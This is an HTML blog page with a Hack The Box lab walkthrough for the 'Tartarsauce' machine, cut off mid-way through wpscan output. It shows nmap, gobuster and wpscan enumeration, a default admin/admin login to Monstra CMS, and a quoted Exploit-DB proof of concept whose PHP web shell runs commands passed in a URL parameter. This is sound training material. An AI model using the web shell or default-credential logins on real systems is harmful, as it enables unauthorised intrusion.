@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Tartarsauce | Initial nmap root@Kali:~# nmap -p- -sV -sC 10.10.10.88 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-11 04:58 GMT Nmap scan report for...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Tartarsauce</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation">
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="https://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (12)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (14)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-02-05 06:23:00+00:00">Wed 05 February 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Tartarsauce.html">Tartarsauce</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Tartarsauce.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <h1>Initial nmap</h1>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="mf">10.10.10.88</span><span class="w"></span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">11</span><span class="w"> </span><span class="mi">04</span><span class="err">:</span><span class="mi">58</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.88</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.018</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
+<span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65534</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w"></span>
+<span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">VERSION</span><span class="w"></span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mf">2.4.18</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">robots</span><span class="p">.</span><span class="nl">txt</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">disallowed</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span>
+<span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">tar</span><span class="o">/</span><span class="n">tar</span><span class="o">/</span><span class="n">source</span><span class="o">/</span><span class="w"> </span>
+<span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">monstra</span><span class="o">-</span><span class="mf">3.0.4</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">easy</span><span class="o">-</span><span class="k">file</span><span class="o">-</span><span class="n">uploader</span><span class="o">/</span><span class="w"> </span>
+<span class="o">|</span><span class="n">_</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">developmental</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">phpmyadmin</span><span class="o">/</span><span class="w"></span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="nl">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.18</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span><span class="w"></span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="nl">title</span><span class="p">:</span><span class="w"> </span><span class="n">Landing</span><span class="w"> </span><span class="n">Page</span><span class="w"></span>
+
+<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">37.17</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
+</pre></div>
+
+
+<p>nmap shows there is a robots.txt file which I was able to confirm from a web browser:</p>
+<p><img alt="" src="../images//tartar-robots.png"></p>
+<p>Only monstra directory gave me a result. Doing some research on the web, I found that Monstra is a lightweight cms. </p>
+<p><img alt="" src="../images//tartar-monstra.png"></p>
+<p>I explored the page source and all the links. The "logged in" hyperlink shows a login page:</p>
+<p><img alt="" src="../images//tartar-monstra-login.png"></p>
+<p>Before trying anything I always like to try simple things so I tried to login with the most standard credentials admin/admin, and believe it or not I am in!</p>
+<p><img alt="" src="../images//tartar-monstra-loggedin.png"></p>
+<p>All seemed too easy to be honest. In fact, I spent a huge amount on what eventually turned out to be a rabbit hole. Using searchsploit I found exploit 43348 which was suitable for my scenario:</p>
+<div class="highlight"><pre><span></span><span class="nx">Proof</span> <span class="k">of</span> <span class="nx">Concept</span>
+<span class="nx">Steps</span> <span class="nx">to</span> <span class="nx">Reproduce</span><span class="o">:</span>
+
+<span class="mf">1.</span> <span class="nx">Login</span> <span class="kd">with</span> <span class="nx">a</span> <span class="nx">valid</span> <span class="nx">credentials</span> <span class="k">of</span> <span class="nx">an</span> <span class="nx">Editor</span>
+<span class="mf">2.</span> <span class="nx">Select</span> <span class="nx">Files</span> <span class="nx">option</span> <span class="nx">from</span> <span class="nx">the</span> <span class="nx">Drop</span><span class="o">-</span><span class="nx">down</span> <span class="nx">menu</span> <span class="k">of</span> <span class="nx">Content</span>
+<span class="mf">3.</span> <span class="nx">Upload</span> <span class="nx">a</span> <span class="nx">file</span> <span class="kd">with</span> <span class="nx">PHP</span> <span class="p">(</span><span class="nx">uppercase</span><span class="p">)</span><span class="nx">extension</span> <span class="nx">containing</span> <span class="nx">the</span> <span class="nx">below</span> <span class="nx">code</span><span class="o">:</span> <span class="p">(</span><span class="nx">EDB</span> <span class="nx">Note</span><span class="o">:</span> <span class="nx">You</span> <span class="nx">can</span> <span class="nx">also</span> <span class="nx">use</span> <span class="p">.</span><span class="nx">php7</span><span class="p">)</span>
+
+           <span class="cp">&lt;?php</span>
+
+ <span class="nv">$cmd</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
+
+ <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+
+ <span class="cp">?&gt;</span>
+
+<span class="mf">4.</span> <span class="nx">Click</span> <span class="nx">on</span> <span class="nx">Upload</span>
+<span class="mf">5.</span> <span class="nx">Once</span> <span class="nx">the</span> <span class="nx">file</span> <span class="nx">is</span> <span class="nx">uploaded</span> <span class="nx">Click</span> <span class="nx">on</span> <span class="nx">the</span> <span class="nx">uploaded</span> <span class="nx">file</span> <span class="nx">and</span> <span class="nx">add</span> <span class="o">?</span><span class="nx">cmd</span><span class="o">=</span> <span class="nx">to</span>
+<span class="nx">the</span> <span class="nx">URL</span> <span class="nx">followed</span> <span class="nx">by</span> <span class="nx">a</span> <span class="nx">system</span> <span class="nx">command</span> <span class="nx">such</span> <span class="nx">as</span> <span class="nx">whoami</span><span class="p">,</span><span class="nx">time</span><span class="p">,</span><span class="nx">date</span> <span class="nx">etc</span><span class="p">.</span>
+</pre></div>
+
+
+<p>However, I was unable to upload or modify anything in the portal so I think that we just have read permissions although we have logged in with the admin user. I think this is just a trick from the author of the box.</p>
+<p>After being stuck there for a while I went back to enumerate and I decided to scan the <strong><em>webservices</em></strong> directory I found earlier with gobuster.</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# gobuster dir -u http://10.10.10.88/webservices -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20</span>
+<span class="err">===============================================================</span>
+<span class="err">Gobuster v3.0.1</span>
+<span class="err">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="err">===============================================================</span>
+<span class="err">[+] Url:            http://10.10.10.88/webservices</span>
+<span class="err">[+] Threads:        20</span>
+<span class="err">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="err">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="err">[+] User Agent:     gobuster/3.0.1</span>
+<span class="err">[+] Timeout:        10s</span>
+<span class="err">===============================================================</span>
+<span class="err">2020/02/11 05:36:09 Starting gobuster</span>
+<span class="err">===============================================================</span>
+<span class="err">/wp (Status: 301)</span>
+</pre></div>
+
+
+<p>I got an immediate hit on the <strong><em>wp</em></strong> directory which could indicate we are dealing with a wordpress site. This was confirmed when I browsed to that page. Although the site seems broken for some reasons we can still see that is powered by wordpress.</p>
+<p><img alt="" src="../images//tartar-wp1.png"></p>
+<p>The first thing I do when I find wordpress is involved is to use <code>wpscan</code> to enumerate the site. Worpress is very popular to have a huge amount of plugins which may present potential vulnerabilities that we can exploit. I lunched the command with the <strong><em>-e ap</em></strong> (enumerate all plugins) option.</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">wpscan</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">ap</span><span class="w"> </span><span class="c1">--url http://10.10.10.88/webservices/wp                                                                                                                             </span>
+<span class="n">_______________________________________________________________</span><span class="w">                                                                                                                               </span>
+<span class="w">         </span><span class="n">__</span><span class="w">          </span><span class="n">_______</span><span class="w">   </span><span class="n">_____</span><span class="w">                                                                                                                                                          </span>
+<span class="w">         </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w">        </span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="w">  </span><span class="n">__</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">____</span><span class="o">|</span><span class="w">                                                                                                                                                         </span>
+<span class="w">          </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w">  </span><span class="o">/</span><span class="err">\</span><span class="w">  </span><span class="o">/</span><span class="w"> </span><span class="o">/|</span><span class="w"> </span><span class="o">|</span><span class="n">__</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">___</span><span class="w">   </span><span class="n">___</span><span class="w">  </span><span class="n">__</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">__</span><span class="w"> </span><span class="err">®</span><span class="w">                                                                                                                                        </span>
+<span class="w">           </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="o">/</span><span class="w">  </span><span class="err">\</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">___</span><span class="o">/</span><span class="w"> </span><span class="err">\</span><span class="n">___</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">__</span><span class="o">|/</span><span class="w"> </span><span class="n">_</span><span class="err">`</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="s1">&#39;_ \                                                                                                                                         </span>
+<span class="s1">            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                                                                        </span>
+<span class="s1">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                                                                        </span>
+
+<span class="s1">         WordPress Security Scanner by the WPScan Team                                                                                                                                        </span>
+<span class="s1">                         Version 3.7.8                                                                                                                                                        </span>
+<span class="s1">       Sponsored by Automattic - https://automattic.com/                                                                                                                                      </span>
+<span class="s1">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                                                                                                        </span>
+<span class="s1">_______________________________________________________________                                                                                                                               </span>
+
+<span class="s1">[+] URL: http://10.10.10.88/webservices/wp/                                                                                                                                                   </span>
+<span class="s1">[+] Started: Tue Feb 11 05:52:01 2020</span>
+
+<span class="s1">Interesting Finding(s):</span>
+
+<span class="s1">[+] http://10.10.10.88/webservices/wp/</span>
+<span class="s1"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)</span>
+<span class="s1"> | Found By: Headers (Passive Detection)</span>
+<span class="s1"> | Confidence: 100%</span>
+
+<span class="s1">[+] http://10.10.10.88/webservices/wp/xmlrpc.php</span>
+<span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
+<span class="s1"> | Confidence: 100%</span>
+<span class="s1"> | References:</span>
+<span class="s1"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span>
+<span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span>
+<span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span>
+<span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span>
+<span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span>
+
+<span class="s1">[+] http://10.10.10.88/webservices/wp/readme.html</span>
+<span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
+<span class="s1"> | Confidence: 100%</span>
+
+<span class="s1">[+] http://10.10.10.88/webservices/wp/wp-cron.php</span>
+<span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
+<span class="s1"> | Confidence: 60%</span>
+<span class="s1"> | References:</span>
+<span class="s1"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span>
+<span class="s1"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span>
+
+<span class="s1">[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).</span>
+<span class="s1"> | Found By: Emoji Settings (Passive Detection)</span>
+<span class="s1"> |  - http://10.10.10.88/webservices/wp/, Match: &#39;</span><span class="n">wp</span><span class="o">-</span><span class="n">includes</span><span class="err">\</span><span class="o">/</span><span class="n">js</span><span class="err">\</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">emoji</span><span class="o">-</span><span class="k">release</span><span class="p">.</span><span class="nf">min</span><span class="p">.</span><span class="n">js</span><span class="vm">?</span><span class="n">ver</span><span class="o">=</span><span class="mf">4.9.4</span><span class="s1">&#39;</span>
+<span class="s1"> | Confirmed By: Meta Generator (Passive Detection)</span>
+<span class="s1"> |  - http://10.10.10.88/webservices/wp/, Match: &#39;</span><span class="n">WordPress</span><span class="w"> </span><span class="mf">4.9.4</span><span class="err">&#39;</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">main</span><span class="w"> </span><span class="n">theme</span><span class="w"> </span><span class="n">could</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">detected</span><span class="p">.</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Enumerating</span><span class="w"> </span><span class="ow">All</span><span class="w"> </span><span class="n">Plugins</span><span class="w"> </span><span class="p">(</span><span class="n">via</span><span class="w"> </span><span class="n">Passive</span><span class="w"> </span><span class="n">Methods</span><span class="p">)</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">plugins</span><span class="w"> </span><span class="k">Found</span><span class="p">.</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">!</span><span class="o">]</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">WPVulnDB</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">Token</span><span class="w"> </span><span class="n">given</span><span class="p">,</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">result</span><span class="w"> </span><span class="n">vulnerability</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="k">output</span><span class="p">.</span><span class="w"></span>
+<span class="o">[</span><span class="n">!</span><span class="o">]</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">free</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="mi">50</span><span class="w"> </span><span class="n">daily</span><span class="w"> </span><span class="n">requests</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">registering</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">wpvulndb</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="n">sign_up</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">Finished</span><span class="p">:</span><span class="w"> </span><span class="n">Tue</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="mi">05</span><span class="err">:</span><span class="mi">52</span><span class="err">:</span><span class="mi">03</span><span class="w"> </span><span class="mi">2020</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Requests</span><span class="w"> </span><span class="nl">Done</span><span class="p">:</span><span class="w"> </span><span class="mi">23</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Cached</span><span class="w"> </span><span class="nl">Requests</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Data</span><span class="w"> </span><span class="nl">Sent</span><span class="p">:</span><span class="w"> </span><span class="mf">6.095</span><span class="w"> </span><span class="n">KB</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Data</span><span class="w"> </span><span class="nl">Received</span><span class="p">:</span><span class="w"> </span><span class="mf">37.379</span><span class="w"> </span><span class="n">KB</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Memory</span><span class="w"> </span><span class="nl">used</span><span class="p">:</span><span class="w"> </span><span class="mf">144.039</span><span class="w"> </span><span class="n">MB</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Elapsed</span><span class="w"> </span><span class="nc">time</span><span class="err">:</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">00</span><span class="err">:</span><span class="mi">01</span><span class="w"></span>
+</pre></div>
+
+
+<p>Nothing really valuable in the output and no plugins were found which is very unusual. From the output I also notices the plugins enumerations happened <strong><em>via Passive Methods</em></strong>. Looking at the <code>wpscan</code> instructions I found out that there are two other methods: mixed and aggressive.</p>
+<p>So I decide to give it a try with aggressive mode adding this option to the command: <strong><em>--plugins-detection aggressive</em></strong>.</p>
+<p>This time I got some results:</p>
+<div class="highlight"><pre><span></span><span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Enumerating</span><span class="w"> </span><span class="ow">All</span><span class="w"> </span><span class="n">Plugins</span><span class="w"> </span><span class="p">(</span><span class="n">via</span><span class="w"> </span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Methods</span><span class="p">)</span><span class="w">                                                                                                                                          </span>
+<span class="w"> </span><span class="n">Checking</span><span class="w"> </span><span class="n">Known</span><span class="w"> </span><span class="n">Locations</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nc">Time</span><span class="err">:</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">05</span><span class="err">:</span><span class="mi">51</span><span class="w"> </span><span class="o">&lt;==========================================================================================================&gt;</span><span class="w"> </span><span class="p">(</span><span class="mi">84849</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">84849</span><span class="p">)</span><span class="w"> </span><span class="mf">100.00</span><span class="o">%</span><span class="w"> </span><span class="nc">Time</span><span class="err">:</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">05</span><span class="err">:</span><span class="mi">51</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Checking</span><span class="w"> </span><span class="n">Plugin</span><span class="w"> </span><span class="n">Versions</span><span class="w"> </span><span class="p">(</span><span class="n">via</span><span class="w"> </span><span class="n">Passive</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Methods</span><span class="p">)</span><span class="w">                                                                                                                             </span>
+
+<span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="n">Plugin</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="nl">Identified</span><span class="p">:</span><span class="w">                                                                                                                                                                     </span>
+
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">akismet</span><span class="w">                                                                                                                                                                                   </span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nl">Location</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">akismet</span><span class="o">/</span><span class="w">                                                                                                                    </span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Last</span><span class="w"> </span><span class="nl">Updated</span><span class="p">:</span><span class="w"> </span><span class="mi">2019</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">13</span><span class="nl">T20</span><span class="p">:</span><span class="mi">46</span><span class="err">:</span><span class="mf">00.000</span><span class="n">Z</span><span class="w">                                                                                                                                                     </span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nl">Readme</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">akismet</span><span class="o">/</span><span class="n">readme</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">[</span><span class="n">!</span><span class="o">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nc">date</span><span class="p">,</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">latest</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="mf">4.1.3</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Found</span><span class="w"> </span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">Known</span><span class="w"> </span><span class="n">Locations</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.88</span><span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">akismet</span><span class="o">/</span><span class="p">,</span><span class="w"> </span><span class="nl">status</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"></span>
+<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nl">Version</span><span class="p">:</span><span class="w"> </span><span class="mf">4.0.3</span><span class="w"> </span><span class="p">(</span><span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="n">confidence</span><span class="p">)</span><span class="w"></span>
